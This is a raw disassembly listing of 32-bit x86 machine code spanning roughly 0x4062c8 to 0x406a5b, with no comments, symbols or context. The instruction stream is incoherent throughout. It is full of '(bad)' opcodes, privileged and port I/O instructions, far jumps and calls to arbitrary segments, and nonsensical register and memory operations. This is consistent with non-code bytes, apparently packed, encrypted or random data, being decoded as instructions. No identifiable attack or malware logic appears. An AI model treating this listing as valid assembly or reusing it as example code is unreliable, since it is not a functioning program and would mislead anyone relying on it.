  4062c8:	sub    dl,cl
  4062ca:	shl    BYTE PTR [edx],0x5e
  4062cd:	mov    edi,0x78a75270
  4062d2:	lods   eax,DWORD PTR ds:[esi]
  4062d3:	pop    ebp
  4062d4:	dec    edx
  4062d5:	pop    ecx
  4062d6:	mov    edi,0xcc1583c7
  4062db:	ret    
  4062dc:	mov    al,0x5b
  4062de:	dec    esi
  4062df:	jne    0x406333
  4062e1:	jae    0x4062d3
  4062e3:	lahf   
  4062e4:	pop    ebp
  4062e5:	imul   edi,DWORD PTR [edx+0x19],0x4c
  4062e9:	adc    al,0x88
  4062eb:	ins    DWORD PTR es:[edi],dx
  4062ec:	xchg   eax,esp
  4062ee:	sbb    ebp,DWORD PTR [esi]
  4062f0:	add    al,0x5f
  4062f2:	xchg   esp,eax
  4062f3:	fwait
  4062f4:	adc    eax,edx
  4062f6:	adc    DWORD PTR [esi-0x3b47a7ef],ebp
  4062fc:	mul    BYTE PTR gs:[esi]
  4062ff:	retf   
  406300:	cmp    ebp,eax
  406302:	fistp  DWORD PTR [ecx-0xa]
  406305:	fwait
  406306:	sub    DWORD PTR [eax+0x4c],ebx
  406309:	aas    
  40630a:	xchg   ebp,eax
  40630b:	dec    esp
  40630c:	pop    ss
  40630d:	pop    eax
  40630e:	adc    ebp,ebx
  406310:	dec    esi
  406311:	fcomip st,st(0)
  406313:	cdq    
  406314:	xor    eax,0x4cef4bb4
  406319:	sbb    BYTE PTR ds:0x11b73e25,0xd7
  406320:	outs   dx,BYTE PTR ds:[esi]
  406321:	jbe    0x4062d1
  406323:	bound  ebx,QWORD PTR [esi]
  406325:	scas   al,BYTE PTR es:[edi]
  406326:	fs jo  0x4062f4
  406329:	xor    al,0xbb
  40632b:	lahf   
  40632c:	and    dl,ah
  40632e:	ret    0x152
  406331:	inc    ebp
  406332:	shr    DWORD PTR [ebp-0x55],0x4c
  406336:	stos   DWORD PTR es:[edi],eax
  406337:	xor    esp,DWORD PTR [esi-0x4afdd22a]
  40633d:	mov    ch,0xd2
  40633f:	pop    edi
  406340:	push   0x50
  406342:	fdiv   st(1),st
  406344:	(bad)  
  406345:	xchg   esi,eax
  406346:	fsubr  QWORD PTR [edi]
  406348:	scas   eax,DWORD PTR es:[edi]
  406349:	(bad)  
  40634a:	test   eax,0x59d43c19
  40634f:	stos   DWORD PTR es:[edi],eax
  406350:	repnz jmp 0xe499:0xda6dd2fe
  406358:	outs   dx,BYTE PTR ds:[esi]
  406359:	push   edi
  40635a:	inc    ecx
  40635b:	loope  0x4063a1
  40635d:	cs lahf 
  40635f:	inc    ecx
  406360:	les    edx,FWORD PTR [edx-0x334fb561]
  406366:	out    dx,al
  406367:	ret    
  406368:	or     al,0x5d
  40636a:	cwde   
  40636b:	cmc    
  40636c:	inc    edi
  40636d:	(bad)  
  40636e:	mov    bh,0x13
  406370:	mov    ds:0xfeb40f6d,eax
  406375:	lods   al,BYTE PTR ds:[esi]
  406376:	fs popw ds
  406379:	imul   eax,DWORD PTR [esp+ecx*8],0xf595f1e5
  406380:	pop    edi
  406381:	test   eax,0x5a7be953
  406386:	inc    eax
  406387:	test   BYTE PTR [eax+0xe],dh
  40638a:	inc    ecx
  40638b:	bound  esp,QWORD PTR [esi-0x4a]
  40638e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40638f:	cdq    
  406390:	rcr    DWORD PTR [ebx+0x5561e4dc],1
  406396:	(bad)  
  406398:	sub    eax,0x38275404
  40639d:	ins    DWORD PTR es:[edi],dx
  40639e:	push   ds
  40639f:	adc    eax,0x4d6a2618
  4063a4:	cmp    al,0x2e
  4063a6:	iret   
  4063a7:	inc    edx
  4063a8:	adc    ah,dl
  4063aa:	sub    DWORD PTR [ecx],edi
  4063ac:	icebp  
  4063ad:	sbb    al,0xa5
  4063af:	fcomp  QWORD PTR [ebp-0x3]
  4063b2:	push   cs
  4063b3:	mov    eax,ds:0xdb921fe5
  4063b8:	sbb    ebp,DWORD PTR [ebp-0x6f]
  4063bb:	out    dx,eax
  4063bc:	shl    ebp,cl
  4063be:	add    DWORD PTR [esi-0x3e71510c],esi
  4063c4:	push   0xffffffcb
  4063c6:	jo     0x4063eb
  4063c8:	dec    esi
  4063c9:	hlt    
  4063ca:	cld    
  4063cb:	add    al,ah
  4063cd:	lds    ebx,FWORD PTR [ecx-0x48652d2a]
  4063d3:	add    DWORD PTR [ebp-0x20],ecx
  4063d6:	sbb    al,0xcf
  4063d8:	or     ebp,ecx
  4063da:	ins    DWORD PTR es:[edi],dx
  4063db:	or     DWORD PTR [edx-0x3d0604ab],ebp
  4063e1:	sub    eax,0xa93fbfab
  4063e6:	mov    ebp,DWORD PTR [ecx+0x748181f7]
  4063ec:	loop   0x406439
  4063ee:	add    bh,dh
  4063f0:	xchg   ebp,eax
  4063f1:	hlt    
  4063f2:	dec    ebp
  4063f3:	jle    0x40642d
  4063f5:	push   ss
  4063f6:	mov    DWORD PTR [ebx-0x60],edx
  4063f9:	fstp   DWORD PTR [ebx-0x73]
  4063fc:	outs   dx,DWORD PTR ds:[esi]
  4063fd:	(bad)  
  4063fe:	mov    dl,0xd0
  406400:	xor    DWORD PTR [edx],ecx
  406402:	and    DWORD PTR [ecx-0x2a],edx
  406405:	(bad)  
  406406:	jecxz  0x40644c
  406408:	inc    edi
  406409:	xchg   ecx,eax
  40640a:	data16 daa 
  40640c:	fsubr  QWORD PTR [edx-0x64d47793]
  406412:	pop    eax
  406413:	pushf  
  406414:	and    al,0x79
  406416:	jg     0x40643c
  406418:	xchg   esi,eax
  406419:	daa    
  40641a:	push   esi
  40641b:	(bad)  
  40641c:	std    
  40641d:	jg     0x4063dd
  40641f:	xlat   BYTE PTR ds:[ebx]
  406420:	pushf  
  406421:	dec    ecx
  406422:	sti    
  406423:	dec    ecx
  406424:	mov    esi,DWORD PTR ds:0x6b656787
  40642a:	push   0xffffffb5
  40642c:	fimul  WORD PTR [ebp-0x3f]
  40642f:	sub    DWORD PTR [ebx-0x3a60e200],ebx
  406435:	test   eax,0xe16c1348
  40643a:	dec    esp
  40643b:	cwde   
  40643c:	jg     0x406457
  40643e:	icebp  
  40643f:	es aam 0x95
  406442:	sub    eax,0x9523177e
  406447:	test   al,0x5a
  406449:	xchg   ebx,eax
  40644a:	xchg   ebx,eax
  40644b:	adc    DWORD PTR [esi],ecx
  40644d:	(bad)  
  40644e:	mov    ss,ebx
  406450:	inc    ebp
  406451:	push   cs
  406452:	popa   
  406453:	mov    esp,0x86f40011
  406458:	popf   
  406459:	call   0x5e25:0x77976269
  406460:	mov    ch,BYTE PTR ds:0xb5d56ea4
  406466:	sub    ecx,eax
  406468:	leave  
  406469:	popa   
  40646a:	test   BYTE PTR [ecx],cl
  40646c:	test   al,0x72
  40646e:	fcomp  DWORD PTR [esi-0xb]
  406471:	push   ds
  406472:	jmp    0x40649b
  406474:	mov    ah,0xfc
  406476:	jbe    0x4064a7
  406478:	out    0x28,eax
  40647a:	enter  0x8be8,0x4c
  40647e:	jp     0x4064df
  406480:	inc    edx
  406481:	push   ss
  406482:	ror    DWORD PTR [edi-0x4b],1
  406485:	xchg   ebp,eax
  406486:	dec    ebp
  406487:	xchg   ecx,eax
  406488:	push   esp
  406489:	repz cdq 
  40648b:	fcomp  DWORD PTR [edx+0x2c92a115]
  406491:	dec    ebp
  406492:	inc    edi
  406493:	sbb    eax,0x69a0794d
  406498:	int3   
  406499:	leave  
  40649a:	arpl   di,cx
  40649c:	jmp    DWORD PTR [ebp+0x6d947cdf]
  4064a2:	daa    
  4064a3:	adc    ebp,ecx
  4064a5:	in     eax,dx
  4064a6:	frstor [eax+0x68]
  4064a9:	fisttp DWORD PTR [edi-0x78]
  4064ac:	sahf   
  4064ad:	dec    esi
  4064ae:	add    esp,edx
  4064b0:	dec    edi
  4064b1:	outs   dx,BYTE PTR ds:[esi]
  4064b2:	ins    BYTE PTR es:[edi],dx
  4064b3:	in     al,0x6c
  4064b5:	jo     0x4064bf
  4064b7:	adc    esi,edx
  4064b9:	mov    ds:0xb752997a,al
  4064be:	mov    DWORD PTR [esi+0x27],ecx
  4064c1:	xor    BYTE PTR [edx],ah
  4064c3:	daa    
  4064c4:	je     0x406545
  4064c6:	outs   dx,DWORD PTR ds:[esi]
  4064c7:	jo     0x406533
  4064c9:	arpl   WORD PTR [ecx-0xe],dx
  4064cc:	scas   eax,DWORD PTR es:[edi]
  4064cd:	pop    edi
  4064ce:	test   eax,0xfa2fe388
  4064d3:	mov    al,0x43
  4064d5:	sahf   
  4064d6:	jbe    0x40648a
  4064d8:	adc    DWORD PTR [ebx],ecx
  4064da:	or     DWORD PTR [eax+0x1094c2fb],ebx
  4064e0:	sbb    al,0x96
  4064e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064e3:	loope  0x4064d6
  4064e5:	xchg   ebp,eax
  4064e6:	or     BYTE PTR [esi-0x16],ah
  4064e9:	arpl   WORD PTR [ebp+0x49],cx
  4064ec:	sbb    BYTE PTR [edi-0x2],dh
  4064ef:	lea    ecx,[edx-0x11]
  4064f2:	mov    bh,0xe6
  4064f4:	adc    ebx,edx
  4064f6:	pop    ebx
  4064f7:	sub    DWORD PTR [ebx-0x10033da2],ebp
  4064fd:	jbe    0x4064f2
  4064ff:	jge    0x40655c
  406501:	jb     0x40653a
  406503:	pop    ds
  406504:	cmp    DWORD PTR [ebp+0x31a5991b],ebx
  40650a:	loop   0x4064de
  40650c:	vcvtsi2sd xmm3,xmm2,DWORD PTR [eax]
  406510:	in     al,0x8d
  406512:	mov    eax,ds:0xe269793c
  406517:	mov    esi,0xa7ad96b0
  40651c:	dec    esi
  40651d:	sbb    esp,DWORD PTR fs:[ebx]
  406520:	sub    eax,0xe5b23e66
  406525:	jl     0x4064da
  406527:	mov    ebp,0x653e1031
  40652c:	sar    BYTE PTR [esi],0x12
  40652f:	inc    ebx
  406530:	out    dx,eax
  406531:	pop    esi
  406532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406533:	add    eax,0xfb4b0a29
  406538:	outs   dx,BYTE PTR ds:[esi]
  406539:	or     eax,0x65254d83
  40653e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40653f:	outs   dx,BYTE PTR ds:[esi]
  406540:	xor    al,0x3f
  406542:	sbb    DWORD PTR [edi*2-0x64b57b3e],esi
  406549:	shr    BYTE PTR [ecx+0xe196f34],0xa0
  406550:	push   esi
  406551:	repnz push es
  406553:	cli    
  406554:	in     al,0x95
  406556:	iret   
  406557:	pop    eax
  406558:	jge    0x4064ff
  40655a:	lock xchg ecx,eax
  40655c:	xchg   edx,eax
  40655d:	sub    al,0xa3
  40655f:	ds jns 0x406526
  406562:	jp     0x4065bd
  406564:	jne    0x4065d7
  406566:	test   BYTE PTR [edx+0x63ee02de],dh
  40656c:	inc    esi
  40656d:	mov    WORD PTR [edi+0x2a],ds
  406570:	jmp    0x5079:0xaaa6
  406576:	fadd   QWORD PTR [ecx]
  406578:	pop    es
  406579:	pop    edi
  40657a:	shr    DWORD PTR [edi+ebx*4],cl
  40657d:	push   esp
  40657e:	into   
  40657f:	add    edi,DWORD PTR [esi-0x7c]
  406582:	add    BYTE PTR ds:[eax-0x37],dl
  406586:	pop    esi
  406587:	cmc    
  406588:	popf   
  406589:	mov    ah,0xac
  40658b:	int    0xa0
  40658d:	dec    ebp
  40658e:	sub    eax,0x46cd16e6
  406593:	push   edx
  406594:	xchg   ebx,eax
  406595:	dec    edx
  406596:	mov    al,al
  406598:	retf   0x8526
  40659b:	mov    dl,0xb8
  40659d:	pusha  
  40659e:	(bad)  
  40659f:	mov    ecx,0x77cecba8
  4065a4:	xchg   ecx,eax
  4065a5:	in     al,dx
  4065a6:	mov    cl,0xaa
  4065a8:	dec    esi
  4065a9:	jnp    0x4065bb
  4065ab:	sbb    eax,0xa3258f3d
  4065b0:	push   esi
  4065b1:	push   ebp
  4065b2:	lods   eax,DWORD PTR ds:[esi]
  4065b3:	mov    ds:0x1f32a724,eax
  4065b8:	outs   dx,DWORD PTR ds:[esi]
  4065b9:	repnz sbb DWORD PTR ds:0xad6c71c7,esp
  4065c0:	push   ecx
  4065c1:	repnz fwait
  4065c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065c4:	inc    ebp
  4065c5:	mov    ds,WORD PTR [edi-0x9]
  4065c8:	jg     0x406581
  4065ca:	xor    DWORD PTR [ecx],edi
  4065cc:	arpl   WORD PTR [ecx],bp
  4065ce:	mov    esp,0x201f6950
  4065d3:	dec    esi
  4065d4:	push   esp
  4065d5:	add    DWORD PTR [eax+0x811a05a],ebp
  4065db:	or     dl,dl
  4065dd:	add    DWORD PTR [esi-0x76ccc697],ebp
  4065e3:	adc    eax,esp
  4065e5:	inc    edi
  4065e6:	(bad)  
  4065e7:	inc    esi
  4065e8:	cmp    al,0xf6
  4065ea:	push   ss
  4065eb:	ret    
  4065ec:	sbb    eax,0xd570b892
  4065f1:	lea    esi,[ebx-0x5e]
  4065f4:	cmc    
  4065f5:	pop    edx
  4065f6:	fnstcw WORD PTR [eax]
  4065f8:	mov    ebx,0x655f19a4
  4065fd:	fs popf 
  4065ff:	int    0x50
  406601:	ins    BYTE PTR es:[edi],dx
  406602:	jae    0x40659b
  406604:	gs out dx,eax
  406606:	fidivr DWORD PTR [ecx-0x2097c4d]
  40660c:	cld    
  40660d:	jno    0x4065af
  40660f:	jno    0x4065ef
  406611:	aas    
  406612:	call   0x4ce:0xeb180358
  406619:	pop    ebp
  40661a:	mov    esp,0x5462361e
  40661f:	push   eax
  406620:	aam    0xec
  406622:	leave  
  406623:	cmp    dh,bh
  406625:	add    eax,0x4c252f4e
  40662a:	xlat   BYTE PTR ds:[ebx]
  40662b:	cmp    al,0x1d
  40662d:	or     edi,DWORD PTR [edi-0x28]
  406630:	popf   
  406631:	ror    edi,1
  406633:	mov    ds:0x6ddf4f58,al
  406638:	retf   
  406639:	out    dx,eax
  40663a:	and    DWORD PTR [edx],edx
  40663c:	outs   dx,BYTE PTR ds:[esi]
  40663d:	daa    
  40663e:	xlat   BYTE PTR ds:[ebx]
  40663f:	aas    
  406640:	retf   0xb940
  406643:	aaa    
  406644:	sbb    BYTE PTR [ebp+0x69],bl
  406647:	lods   al,BYTE PTR ds:[esi]
  406648:	ins    BYTE PTR es:[edi],dx
  406649:	push   es
  40664a:	and    ecx,ecx
  40664c:	rcr    DWORD PTR [edi+0x2],1
  40664f:	dec    ebp
  406650:	mov    eax,ds:0x13d45975
  406655:	jmp    0x7f2278df
  40665a:	and    eax,edx
  40665c:	sub    al,0x44
  40665e:	rcl    ah,0xf0
  406661:	in     al,0x1f
  406663:	int    0xa8
  406665:	mov    edx,0x8732e7c1
  40666a:	inc    edx
  40666b:	hlt    
  40666c:	aad    0x3c
  40666e:	adc    al,0x5f
  406670:	jge    0x406677
  406672:	fsubr  st(2),st
  406674:	inc    ebp
  406675:	xchg   esi,eax
  406676:	out    0x0,al
  406678:	fcmovnbe st,st(0)
  40667a:	call   0x2497:0x920f9af
  406681:	sti    
  406682:	mov    ch,0x9c
  406684:	icebp  
  406685:	hlt    
  406686:	lods   eax,DWORD PTR ds:[esi]
  406687:	jne    0x406696
  406689:	pop    eax
  40668a:	push   ebx
  40668b:	ins    DWORD PTR es:[edi],dx
  40668c:	adc    al,0x1b
  40668e:	jmp    0x4066d6
  406690:	and    bl,dl
  406692:	pop    edi
  406693:	xor    dh,al
  406695:	mov    eax,ds:0x3ac9a348
  40669a:	lds    esp,FWORD PTR [edi+0xcdfddd1]
  4066a0:	push   ds
  4066a1:	xchg   ecx,eax
  4066a2:	scas   eax,DWORD PTR es:[edi]
  4066a3:	(bad)  
  4066a4:	not    edx
  4066a6:	jmp    0x4066ee
  4066a8:	in     eax,0x12
  4066aa:	mov    bl,0x6a
  4066ac:	cmp    ebp,DWORD PTR [ebx-0x25270f68]
  4066b2:	(bad)  
  4066b3:	loopne 0x406696
  4066b5:	aaa    
  4066b6:	repnz push ss
  4066b8:	fist   WORD PTR [di+0x3949]
  4066bd:	jecxz  0x406664
  4066bf:	test   bl,bl
  4066c1:	and    ch,BYTE PTR [ecx+0x5e]
  4066c4:	pop    ecx
  4066c5:	enter  0xa00c,0x27
  4066c9:	scas   eax,DWORD PTR es:[edi]
  4066ca:	sbb    eax,0xb7e974d0
  4066cf:	mov    BYTE PTR [esi],bl
  4066d1:	dec    esp
  4066d2:	sub    BYTE PTR [edi-0x12],ah
  4066d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066d6:	aad    0x4f
  4066d8:	imul   edi,DWORD PTR [esi],0x11239c1c
  4066de:	stc    
  4066df:	fisub  WORD PTR [edx+0x31836f5a]
  4066e5:	sub    ebx,DWORD PTR [eax-0x5d79744d]
  4066eb:	shr    DWORD PTR [ebx],cl
  4066ed:	inc    edx
  4066ee:	int    0x75
  4066f0:	stos   BYTE PTR es:[edi],al
  4066f1:	aad    0x6b
  4066f3:	inc    ecx
  4066f4:	(bad)  
  4066f5:	idiv   DWORD PTR [ebx+ecx*2+0x7c]
  4066f9:	jmp    0xae22f337
  4066fe:	push   ebp
  4066ff:	pop    edx
  406700:	cdq    
  406701:	pop    ebp
  406702:	mov    dh,0x4f
  406704:	dec    edx
  406705:	sub    al,0xe5
  406707:	mov    ebp,0xc53d68d2
  40670c:	mov    al,ds:0x8940299d
  406711:	jnp    0x40669f
  406713:	shl    DWORD PTR [ecx+0x16],0x35
  406717:	sbb    al,0x9d
  406719:	add    ch,cl
  40671b:	add    al,0xc5
  40671d:	mov    edx,0xadeb9b35
  406722:	je     0x406748
  406724:	ja     0x406710
  406726:	in     eax,0xa2
  406728:	ja     0x406782
  40672a:	and    DWORD PTR [ebx-0x18],eax
  40672d:	cmp    al,BYTE PTR [ecx-0x3b]
  406730:	dec    edx
  406731:	scas   eax,DWORD PTR es:[edi]
  406732:	icebp  
  406733:	data16 scas al,BYTE PTR es:[edi]
  406735:	mov    dh,0xd6
  406737:	dec    ebp
  406738:	adc    al,al
  40673a:	das    
  40673b:	dec    edx
  40673c:	push   ds
  40673d:	faddp  st(4),st
  40673f:	mov    bh,0x1c
  406741:	dec    esp
  406742:	test   al,0xf1
  406744:	mov    cl,BYTE PTR [edx-0x7e]
  406747:	jno    0x4067c4
  406749:	and    al,0xef
  40674b:	adc    al,0x88
  40674d:	mov    DWORD PTR [edx+0x2a],0x8d3f1b6c
  406754:	gs cmc 
  406756:	inc    eax
  406757:	jo     0x4067ae
  406759:	or     al,0xc8
  40675b:	jl     0x4067c2
  40675d:	push   cs
  40675e:	mov    ds:0x495b9d5d,eax
  406763:	jge    0x4067b4
  406765:	inc    ebx
  406766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406767:	rcr    DWORD PTR [ecx-0x860e737],1
  40676d:	or     bl,dl
  40676f:	xchg   BYTE PTR [ebp+0x71],al
  406772:	add    cl,ah
  406774:	dec    edx
  406775:	cdq    
  406776:	mov    DWORD PTR [esi],esi
  406778:	mov    bh,0x66
  40677a:	pop    ss
  40677b:	imul   ecx,DWORD PTR [edx+0x39],0xc351ee3d
  406782:	mov    cl,0x96
  406784:	add    DWORD PTR [ebx+ecx*4],edx
  406787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406788:	and    al,0x52
  40678a:	add    eax,0x3fa2efc2
  40678f:	add    al,0x95
  406791:	sub    eax,0x6cecf2c9
  406796:	int    0x99
  406798:	jne    0x4067f1
  40679a:	xchg   edx,eax
  40679b:	or     DWORD PTR [edx],edi
  40679d:	lock adc al,0xef
  4067a0:	jmp    0xf984:0xb26e4d9
  4067a7:	mov    cl,0xad
  4067a9:	je     0x406737
  4067ab:	ficom  DWORD PTR [esi+0x4ee1cbbc]
  4067b1:	adc    BYTE PTR [ecx-0x14c5d26e],ch
  4067b7:	imul   esp,DWORD PTR [ecx-0x6ef20c26],0x63d8d170
  4067c1:	adc    BYTE PTR [ebx-0x54],dh
  4067c4:	sub    DWORD PTR gs:[eax],eax
  4067c7:	(bad)  
  4067c8:	shl    DWORD PTR [ebx+0x6e206e94],1
  4067ce:	mov    ds:0xb3bb05b3,eax
  4067d3:	aad    0x91
  4067d5:	outs   dx,BYTE PTR ds:[esi]
  4067d6:	push   0x5a
  4067d8:	and    edx,edx
  4067da:	fnstcw WORD PTR [esi]
  4067dc:	and    edi,DWORD PTR [eax-0x16]
  4067df:	addr16 mov esi,0xfe61361a
  4067e5:	out    0x9,eax
  4067e7:	pandn  mm1,QWORD PTR [esi+edi*2+0x41ae07a5]
  4067ef:	test   eax,0x42459b34
  4067f4:	jnp    0x4067f7
  4067f6:	test   DWORD PTR [eax+0x1da92b9d],0x39f3235
  406800:	fld    QWORD PTR [ebp+ebx*1+0x2c87620d]
  406807:	and    esi,0x67
  40680a:	enter  0xbffa,0x41
  40680e:	fs push eax
  406810:	in     al,0x1
  406812:	int3   
  406813:	js     0x4067d2
  406815:	mov    esp,0xc32c483a
  40681a:	adc    esi,ebp
  40681c:	jb     0x4067d2
  40681e:	icebp  
  40681f:	pushf  
  406820:	fcmovnu st,st(7)
  406822:	mov    bh,BYTE PTR [ebx+0x69]
  406825:	inc    edi
  406826:	mov    ds:0x816b9e5e,eax
  40682b:	jecxz  0x406834
  40682d:	push   esp
  40682e:	sbb    DWORD PTR [esi+0x1513c4e6],edx
  406834:	addr16 dec ebp
  406836:	jbe    0x406877
  406838:	fcomp  st(3)
  40683a:	sbb    dh,al
  40683c:	pop    es
  40683d:	pusha  
  40683e:	add    BYTE PTR [edx],0xc5
  406841:	pop    esp
  406842:	aaa    
  406843:	adc    edx,DWORD PTR [esi+0x60]
  406846:	sub    ecx,DWORD PTR [ebx+edx*4-0x24]
  40684a:	sbb    dh,ch
  40684c:	inc    ebx
  40684d:	les    ebx,FWORD PTR [edx-0x7d]
  406850:	cld    
  406851:	adc    bl,dl
  406853:	fldenv [edi]
  406855:	adc    al,0xb5
  406857:	dec    esi
  406858:	(bad)  
  406859:	out    0x78,eax
  40685b:	ret    0xc1e2
  40685e:	enter  0x3109,0xd2
  406862:	in     eax,dx
  406863:	jnp    0x4068db
  406865:	jmp    esi
  406867:	sbb    DWORD PTR [ebx-0x4c],0xffffffa7
  40686b:	sar    DWORD PTR [edi+ebx*4+0x2e],0x27
  406870:	mov    dl,0x8b
  406872:	mov    ?,WORD PTR [esi]
  406874:	and    al,0xa0
  406876:	out    dx,eax
  406877:	(bad)  
  406878:	xchg   esp,eax
  406879:	mov    ds:0x81ab041e,al
  40687e:	push   esp
  40687f:	cmp    al,0x14
  406881:	out    dx,eax
  406882:	fistp  WORD PTR [ecx-0x778a12b4]
  406888:	idiv   BYTE PTR [edx-0x3b9a7bf8]
  40688e:	dec    ebx
  40688f:	call   0x17940f6d
  406894:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406895:	add    eax,0x34ca9bd8
  40689a:	retf   
  40689b:	push   ss
  40689c:	addr16 iret 
  40689e:	loopne 0x406858
  4068a0:	fistp  DWORD PTR [esi]
  4068a2:	cmp    BYTE PTR [ebx+0x6d754020],bh
  4068a8:	cli    
  4068a9:	clc    
  4068aa:	jbe    0x4068a9
  4068ac:	sbb    al,0xfb
  4068ae:	mov    esp,DWORD PTR [edi]
  4068b0:	call   0x2530:0xbf344223
  4068b7:	sbb    al,0x90
  4068b9:	cmp    eax,DWORD PTR [esi-0x4a]
  4068bc:	mov    dl,0xc7
  4068be:	icebp  
  4068bf:	dec    eax
  4068c0:	cdq    
  4068c1:	jmp    0x932e9fd7
  4068c6:	pushf  
  4068c7:	(bad)  
  4068c8:	fldenv [esi]
  4068ca:	pop    edx
  4068cb:	test   al,0x87
  4068cd:	jmp    0xafdb8377
  4068d2:	rcr    ecx,0xff
  4068d5:	push   0x3395ddb6
  4068da:	inc    esi
  4068db:	pushf  
  4068dc:	mul    DWORD PTR ds:[ecx]
  4068df:	inc    edi
  4068e0:	cli    
  4068e1:	cmp    bl,bl
  4068e3:	retf   0x7df0
  4068e6:	adc    ecx,esi
  4068e8:	(bad)  
  4068e9:	hlt    
  4068ea:	arpl   WORD PTR [edi+eiz*8+0x6f],dx
  4068ee:	jae    0x406893
  4068f0:	xchg   esi,edx
  4068f2:	ja     0x40689e
  4068f4:	jb     0x4068ca
  4068f6:	or     ebx,DWORD PTR [ecx+edx*4]
  4068f9:	cmp    ebp,ebx
  4068fb:	je     0x406913
  4068fd:	pusha  
  4068fe:	jmp    0x5675c1ef
  406903:	xor    al,ah
  406905:	out    0xe6,al
  406907:	or     BYTE PTR [eax-0x30],al
  40690a:	or     dl,dh
  40690c:	pop    ss
  40690d:	sbb    eax,0x43adf11
  406912:	ins    DWORD PTR es:[edi],dx
  406913:	scas   al,BYTE PTR es:[edi]
  406914:	mov    edi,0x593e1f0c
  406919:	sbb    al,0x7c
  40691b:	xor    DWORD PTR [edx-0x7635821],ebx
  406921:	inc    edx
  406922:	or     al,0x8b
  406924:	and    ecx,DWORD PTR [ebp-0x38]
  406927:	sar    BYTE PTR [ebx+0x6178567a],0xfa
  40692e:	pushf  
  40692f:	loop   0x4068cc
  406931:	aaa    
  406932:	fistp  QWORD PTR [edi+edi*2+0x8c88907]
  406939:	fnstcw WORD PTR [esi-0x3f13679e]
  40693f:	adc    al,0x66
  406941:	jbe    0x40694b
  406943:	(bad)  
  406944:	int3   
  406945:	out    dx,al
  406946:	cmp    edx,DWORD PTR [eax+0x3c]
  406949:	bound  edi,QWORD PTR [esi-0x27]
  40694c:	xchg   edi,eax
  40694d:	xlat   BYTE PTR ds:[ebx]
  40694e:	xchg   DWORD PTR [ecx+0x33],edi
  406951:	gs fwait
  406953:	push   esp
  406954:	inc    ebp
  406955:	popa   
  406956:	push   ecx
  406957:	out    0x92,al
  406959:	(bad)  
  40695a:	pop    ds
  40695b:	add    eax,0xefeb0815
  406960:	retf   
  406961:	dec    eax
  406962:	jmp    0x406991
  406964:	repz shl DWORD PTR [edi+edi*1],cl
  406968:	clc    
  406969:	sub    edi,eax
  40696b:	aad    0xd9
  40696d:	pushf  
  40696e:	jne    0x406983
  406970:	call   0x40cc9e40
  406975:	pop    ebx
  406976:	(bad)  
  406977:	cmp    BYTE PTR [ecx],bl
  406979:	shl    DWORD PTR ds:0x2ba50324,cl
  40697f:	dec    esi
  406980:	mov    ds:0xb150b3c7,al
  406985:	je     0x4069e1
  406987:	das    
  406988:	ret    0x9f3c
  40698b:	xchg   esi,eax
  40698c:	jl     0x4069da
  40698e:	loopne 0x406964
  406990:	test   al,0xb4
  406992:	xchg   esp,eax
  406993:	or     BYTE PTR [ebx+0x3ca0818a],0xbb
  40699a:	sbb    al,0x37
  40699c:	push   edx
  40699d:	mov    dl,dh
  40699f:	stos   BYTE PTR es:[edi],al
  4069a0:	xchg   esp,eax
  4069a1:	push   ebx
  4069a2:	jb     0x40692e
  4069a4:	push   ss
  4069a5:	mov    dh,0x1b
  4069a7:	adc    DWORD PTR [esi],edi
  4069a9:	and    DWORD PTR ss:[edi+ecx*8-0x7256e2fb],edx
  4069b1:	dec    ebp
  4069b2:	adc    DWORD PTR [ebx+edi*4],0xefdc7718
  4069b9:	mov    ecx,0x7d2dc636
  4069be:	mov    ds:0xf4d0a8c4,eax
  4069c3:	rcl    DWORD PTR [edx],cl
  4069c5:	pop    ebp
  4069c6:	xor    ebp,ecx
  4069c8:	jecxz  0x4069a9
  4069ca:	and    bl,BYTE PTR [edi-0x4079272d]
  4069d0:	sbb    BYTE PTR [ebx-0x49],ch
  4069d3:	ins    BYTE PTR es:[edi],dx
  4069d4:	loope  0x406a1b
  4069d6:	out    dx,eax
  4069d7:	mov    DWORD PTR [ebx-0x11],eax
  4069da:	pop    ebp
  4069db:	aad    0x58
  4069dd:	sub    DWORD PTR [eax-0x80],edi
  4069e0:	add    ch,BYTE PTR [ebx]
  4069e2:	dec    ecx
  4069e3:	inc    edx
  4069e4:	mov    al,0xde
  4069e6:	hlt    
  4069e7:	and    dl,ch
  4069e9:	sbb    dh,dl
  4069eb:	xchg   esi,eax
  4069ec:	fist   DWORD PTR [esi]
  4069ee:	sbb    DWORD PTR [eax-0x63],esp
  4069f1:	push   esp
  4069f2:	dec    edi
  4069f3:	aam    0x84
  4069f5:	xor    BYTE PTR [edx+0x50ed75a8],bh
  4069fb:	jb     0x406a71
  4069fd:	neg    esi
  4069ff:	xor    DWORD PTR [ecx-0x41],edx
  406a02:	cmp    cl,dl
  406a04:	scas   eax,DWORD PTR es:[edi]
  406a05:	(bad)
  406a08:	xchg   ebp,eax
  406a09:	pop    ss
  406a0a:	or     al,0x6b
  406a0c:	rsm    
  406a0e:	inc    edi
  406a0f:	(bad)  
  406a10:	mov    ds,ebp
  406a12:	mov    esp,0xab22bf29
  406a17:	or     bl,BYTE PTR [eax-0x7bbb415a]
  406a1d:	jmp    0x4503:0x4cac6bf0
  406a24:	aaa    
  406a25:	test   eax,0x5aa66299
  406a2a:	or     eax,0x704c137
  406a2f:	adc    ebp,DWORD PTR [ecx+0x3f]
  406a32:	mov    dh,0xa2
  406a34:	push   ss
  406a35:	dec    ebp
  406a36:	ins    DWORD PTR es:[edi],dx
  406a37:	and    BYTE PTR [ebx+0x53],ch
  406a3a:	outs   dx,DWORD PTR gs:[esi]
  406a3c:	push   esp
  406a3d:	mov    gs,WORD PTR [ecx-0x7a]
  406a40:	xchg   ecx,eax
  406a41:	mov    eax,ds:0xf5b41aa9
  406a46:	jnp    0x406a00
  406a48:	mov    eax,DWORD PTR [ebx+0x12bd33a2]
  406a4e:	push   esi
  406a4f:	and    DWORD PTR [edi],0xe8a6459e
  406a55:	mov    ds:0x94ec82ce,eax
  406a5a:	cmc    
  406a5b:	mov    dh,0x77
